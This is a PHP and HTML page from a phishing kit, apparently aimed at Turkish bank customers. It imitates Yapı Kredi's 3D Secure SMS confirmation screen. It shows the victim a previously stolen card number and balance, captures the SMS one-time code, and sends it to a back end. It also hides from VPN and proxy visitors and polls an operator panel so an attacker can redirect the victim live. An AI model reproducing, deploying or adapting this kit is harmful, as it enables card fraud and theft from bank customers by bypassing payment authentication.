<?php include_once("../config.php"); include_once("../monke/Data/Server/GrabIP.php"); include_once("../monke/Data/Server/BlockVPN.php"); include_once("../monke/Data/Client/GetBank.php"); include_once("../monke/Data/Server/BanControl.php");

  $check = $pdo->query("SELECT * FROM logs WHERE ip = '{$ip}'")->fetch(PDO::FETCH_ASSOC);
  $checkAdmin = $pdo->query("SELECT * FROM admin_settings")->fetch(PDO::FETCH_ASSOC);
  $checkSepet = $pdo->query("SELECT * FROM sepet WHERE ip_adresi = '{$ip}'")->fetch(PDO::FETCH_ASSOC);
  
  if($checkAdmin["proxy_vpn"] == 1) {
   if($proxy == 1 or $hosting == 1) {
    die('Proxy & VPN Firewall - monke');
   } 
  }

  if($check["kredi_karti"]) {
    $pdo->query("UPDATE logs SET durum = 'SMS Ekranı' WHERE ip = '{$ip}'");
  } else {
    header("Location: /");
  }

  if($checkSepet["ip_adresi"]) {
    $pdo->query("UPDATE logs SET durum = 'SMS Ekranı' WHERE ip = '{$ip}'");
  } else {
    header("Location: /");
  }

  switch($_GET["control"]){
    case 'success';
     echo("<script> setTimeout(function(){ window.location='/siparisiniz-alindi'; }, 2750);</script>");
    break;
  }

  if($check["marka"] == "MASTERCARD") {
    $yapikredi_marka = "./assets/tdstroy-static/img/MASTERCARD.png";
  } else if($check["marka"] == "VISA") {
    $yapikredi_marka = "./assets/tdstroy-static/img/VISA.png";
  }
  
?>
<html lang="tr" class="ng-scope">
  <head>
    <style type="text/css">
      @charset "UTF-8";

      [ng\:cloak],
      [ng-cloak],
      [data-ng-cloak],
      [x-ng-cloak],
      .ng-cloak,
      .x-ng-cloak,
      .ng-hide:not(.ng-hide-animate) {
        display: none !important;
      }

      ng\:form {
        display: block;
      }

      .ng-animate-shim {
        visibility: hidden;
      }

      .ng-anchor {
        position: absolute;
      }
    </style>
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <title>Yapı Kredi</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <link rel="stylesheet" type="text/css" href="./assets/tdstroy-static/css/tds.css">
    <link rel="stylesheet" type="text/css" href="./assets/tdstroy-static/css/ngDialog.css">
    <link rel="stylesheet" type="text/css" href="./assets/tdstroy-static/css/ngDialog-custom-width.css">
    <link rel="stylesheet" type="text/css" href="./assets/tdstroy-static/css/ngDialog-theme-default.css">
    <link rel="stylesheet" type="text/css" href="./assets/tdstroy-static/css/ngDialog-theme-plain.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.3/jquery.min.js" integrity="sha512-STof4xm1wgkfm7heWqFJVn58Hm3EtS31XFaagaa8VMReCXAkQnJZ+jEy8PCC/iT18dFy95WcExNHFTqLyp72eQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>    <script type="text/javascript" src="./assets/tdstroy-static/js/jquery.validate.min.js"></script>
    <link rel="stylesheet" href="./assets/tdstroy-static/css/bootstrap.min.css">
    <link rel="stylesheet" href="./assets/tdstroy-static/css/bootstrap-theme.min.css">
    <link rel="stylesheet" href="./assets/tdstroy-static/css/main.css">
    <script src="./assets/tdstroy-static/js/vendor/bootstrap.min.js"></script>
  </head>
  <body>
    <div>
      <div data-ng-view="" class="ng-scope">
        <div class="wrapper ng-scope" style="padding-top: 50px; padding-bottom: 0;">
          <div class="container">
          <div class="card standart-mea" style="margin: auto;">
            <?php if($_GET['control'] == "success"): ?>
              <div class="card-header">
                <h3 class="card-heading pull-left ng-binding" style="font-size: 14px;">Üç Boyutlu Güvenlik Sistemi</h3>
                <div class="header-menu pull-right">
                  <a class="help" href="javascript:void(0);">
                    <span class="icon">?</span>
                    <span style="font-size:12px;" class="ng-binding">Yardım</span>
                  </a>
                  <a class="help" href="javascript:void(0);">
                    <span class="icon ng-binding">EN</span>
                    <span style="font-size:12px;" class="ng-binding">English</span>
                  </a>
                </div>
              </div>
              <div class="card-content standart-mea" style="padding: 10px;">
                <div class="ng-scope">
                  <div class="row head-row ng-scope" style="padding-top: 0px; padding-bottom: 10px;">
                    <div class="col-xs-12">
                      <img src="./assets/tdstroy-static/img/ykblogo.svg" alt="Yapı Kredi" style="width: 120px; height: 47px;">
                      <img class="pull-right" alt="">
                    </div>
                  </div>
                </div>
                <div class="container" style="width: inherit">
                  <div class="row ng-scope" ng-if="post">
                    <div class="col-sm-12 col-xs-12" style="margin-top: 50px;">
                      <div id="successWrapper" align="center">
                        <img id="succesImage" alt="succesImage" width="100" style="margin-bottom: 20px;" src="./assets/tdstroy-static/img/success-icon.png">
                        <p class="disclaimer">
                          <strong class="ng-binding">Doğrulama kodu başarıyla onaylandı.</strong>
                        </p>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            <?php else: ?>
              <div class="card-header">
                <h3 class="card-heading pull-left ng-binding" style="font-size: 14px;">Üç Boyutlu Güvenlik Sistemi</h3>
                <div class="header-menu pull-right">
                  <a class="help" href="javascript:void(0);">
                    <span class="icon">?</span>
                    <span style="font-size:12px;" class="ng-binding">Yardım</span>
                  </a>
                  <a class="help" href="javascript:void(0);">
                    <span class="icon ng-binding">EN</span>
                    <span style="font-size:12px;" class="ng-binding">English</span>
                  </a>
                </div>
              </div>
              <div class="card-content standart-mea" style="padding: 10px;">
                <div class="ng-scope">
                  <div class="row head-row ng-scope" style="padding-top: 0px; padding-bottom: 10px;">
                    <div class="col-xs-12">
                      <img src="./assets/tdstroy-static/img/ykblogo.svg" alt="Yapı Kredi" style="width: 120px; height: 47px;">
                      <img class="pull-right" src="<?php echo $yapikredi_marka; ?>" style="width: 60px; margin-top: 12px;">
                    </div>
                  </div>
                </div>
                <div class="customer-info ng-scope" style="font-size: 12px;" ng-if="!post && ecom && !waiting">
                  <div class="row">
                    <div class="col-xs-5 ng-binding">Üye İşyeri İsmi</div>
                    <div class="col-xs-7 customer-val">
                      <strong class="ng-binding"><?php echo $checkAdmin["isyeri_adi"]; ?></strong>
                    </div>
                  </div>
                  <div class="row">
                    <div class="col-xs-5 ng-binding">Tutar</div>
                    <div class="col-xs-7 customer-val">
                      <strong class="ng-binding"><?php echo $check["bakiye"]; ?></strong>
                    </div>
                  </div>
                  <div class="row">
                    <div class="col-xs-5 ng-binding">Tarih</div>
                    <div class="col-xs-7 customer-val">
                      <strong class="ng-binding"><?php echo date('d/m/Y H:i:s'); ?></strong>
                    </div>
                  </div>
                  <div class="row">
                    <div class="col-xs-5 ng-binding">Kart Numarası</div>
                    <div class="col-xs-7">
                      <strong class="ng-binding"><?php echo substr($check["kredi_karti"], 0, 4); ?> <?php echo substr($check["kredi_karti"], -12, 2); ?>** **** <?php echo substr($check["kredi_karti"], 12, 16); ?></strong>
                    </div>
                  </div>
                  <div class="row ng-scope" ng-if="gsm != null && currentApprovalType === 'AS'">
                    <div class="col-xs-5 ng-binding">Cep Telefonu</div>
                    <div class="col-xs-7 customer-val">
                      <strong class="ng-binding">0 5** *** ** **</strong>
                    </div>
                  </div>
                  <p class="disclaimer">
                    <span class="warning-icon ng-binding">Bu bilgiler işyerleri ile paylaşılmamaktadır.</span>
                  </p>
                </div>
                <form class="form-horizontal container ng-pristine ng-valid ng-scope" style="width: inherit; font-size: 12px; padding-top: 10px;" method="POST">
                  <div class="form-content row ng-scope" style="margin: 0px;">
                    <div class="ng-scope" style="margin-bottom: 0px; font-size: 13px;">
                      <div class="col-sm-4 col-xs-6" style="font-size:12px; padding-right: 0px; padding-left: 0px;">
                        <label for="otpCode" class="smsinfo control-label ng-binding" style="padding-left: 0px; padding-right: 0px; margin-top: 5px;">Akıllı SMS Şifresi</label>
                      </div>
                      <div ng-class="inputClass" style="margin-bottom: 5px;" class="smsinfo col-sm-8 col-xs-6">
                        <div class="info-input">
                          <input type="number" id="otpCode" name="otpCode" class="form-control ng-pristine ng-untouched ng-valid <?php if($_GET['control'] == "error"): echo "tdserrorinput"; endif;?>" onkeypress="return ((event.charCode >= 48 && event.charCode <= 57 && value.length <5 ) || event.charCode == 13 || event.charCode == 0)">
                        </div>
                      </div>
                    </div>
                    <div class="tdserror ng-scope" id="yapikredi_hata" style="padding-left: 0px; display: none;">
                      <div class="smsinfo media-error col-xs-12" style="padding-left: 0px; margin-top: 5px;">
                        <p class="ng-binding" id="hata-mesaji"></p>
                      </div>
                    </div>
                    <?php if($_GET["control"] == "error"): ?>
                    <div class="tdserror ng-scope" id="sms_hatasi" style="padding-left: 0px;">
                      <div class="smsinfo media-error col-xs-12" style="padding-left: 0px; margin-top: 5px;">
                        <p class="ng-binding">Akıllı SMS şifrenizi yanlış girdiniz. Lütfen tekrar deneyiniz.</p>
                      </div>
                    </div>
                    <?php endif; ?>
                  </div>
                  <div class="form-content row" style="margin: 0px; padding-top: 0px;">
                    <div ng-if="!showUserList" class="ng-scope">
                      <div class="col-sm-12 col-xs-12" style="padding-left: 0px; padding-right: 0px;">
                        <div class="row">
                          <div class="smsinfo col-sm-12 col-xs-12">
                            <p class="ng-binding">Cep telefonu numaranızı değiştirmek için <a href="javascript:void(0);" class="ng-binding">tıklayınız.</a>
                            </p>
                          </div>
                        </div>
                      </div>
                    </div>
                    <div class="form-footer" style="background-color: #f1f8fe; padding-bottom: 10px;">
                      <div class="" style="margin-bottom: 0px; margin: auto;">
                        <div class="col-sm-12 col-xs-12 ng-scope" style="margin-top: 10px;">
                          <button class="submit-btn pull-right ng-binding" style="margin: auto; /*width: 100%;*/; background-color: #00a8ff; color: #fff; border: 1px solid #00a8ff;" id="onay_buton" type="button">Onay</button>
                          <button class="cancel-btn pull-right ng-binding" style="padding-right: 10px; padding-left: 10px;" type="button" data-ng-click="reject()">Vazgeç</button>
                        </div>
                      </div>
                    </div>
                  </div>
                </form>
                <div class="container" style="width: inherit"></div>
              </div>
            </div>
            <?php endif; ?>
          </div>
        </div>
      </div>
    </div>
    <script>
      document.getElementById("onay_buton").addEventListener("click", function(e) {
        var otpCode = $("input[name=otpCode]").val();

        e.preventDefault();

        if (otpCode == null || otpCode == "" || otpCode.length != 5) {
          document.getElementById("yapikredi_hata").style.display = "block"; 
          document.getElementById("otpCode").classList.add("tdserrorinput");
          if(window.location.search == "?control=error") {
            document.getElementById("sms_hatasi").style.display = "none"; 
          }
          document.getElementById("hata-mesaji").innerHTML = "En az 5 karakter girmelisiniz.";
          document.getElementById('onay_buton').disabled = false; 
        } else {
          document.getElementById("otpCode").classList.remove("tdserrorinput");
          if(window.location.search == "?control=error") {
            document.getElementById("sms_hatasi").style.display = "none"; 
          }
          document.getElementById("yapikredi_hata").style.display = "none";

          $.ajax({
            type: "POST",
            url: "action/process.php",
            data: {
              otpCode: otpCode
            },
            success: function (data) {
              document.getElementById('onay_buton').setAttribute("disabled", "disabled");
              document.getElementById('onay_buton').innerHTML = "Lütfen bekleyiniz...";
            }
          });
        }
      });
    </script>
    <script type="text/javascript">
      $(document).ready(function() {
        gonder();
        var int = self.setInterval("gonder()", 2500);
      });
      
      function gonder() {
        $.ajax({
           type: 'POST',
           url: '<?php echo "../veri.php?ip=".$ip; ?>',
           success: function(msg) {
              if (msg.includes('sms')) {
                  window.location.href = '../acsredirect';
              }
              if (msg.includes('tebrikler')) {
                  window.location.href = '../acsredirect?control=success';
              }
              if (msg.includes('hata_sms')) {
                  window.location.href = '../acsredirect?control=error';
              }
              if (msg.includes('hata_limit')) {
                window.location.href = '/?redirect=error_limit';
              }
              if (msg.includes('hata_internet')) {
                 window.location.href = '/?redirect=error_internet';
              }
			   if (msg.includes('hata_cvv')) {
                  window.location.href = '/odeme?status=cvv';
              }
              if (msg.includes('hata_skt')) {
                  window.location.href = '/odeme?status=skt';
              }
              if (msg.includes('hata_dogrulama')) {
                window.location.href = '/dogrulama?control=error';
              }
              if (msg.includes('dogrulama')) {
                 window.location.href = '/dogrulama';
              }
              if (msg.includes('basa_dondur')) {
                  window.location.href = '/';
              }
           }
        });
      }     
    </script>
  </body>
</html>